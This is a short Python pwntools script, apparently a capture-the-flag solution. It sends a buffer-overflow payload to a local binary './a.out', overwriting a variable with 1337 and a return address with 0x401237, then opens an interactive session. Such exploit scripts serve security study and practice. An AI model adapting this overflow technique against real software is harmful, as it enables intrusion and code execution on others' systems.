#!/usr/bin/env python3
from pwn import *

r = process("./a.out")

buf = b'A' * 9
buf += p32(1337)
buf = buf.ljust(65, b'B')
buf += p64(0x401237)

log.info("Payload")
print(hexdump(buf, width=12))
r.writeline(buf)
r.interactive()
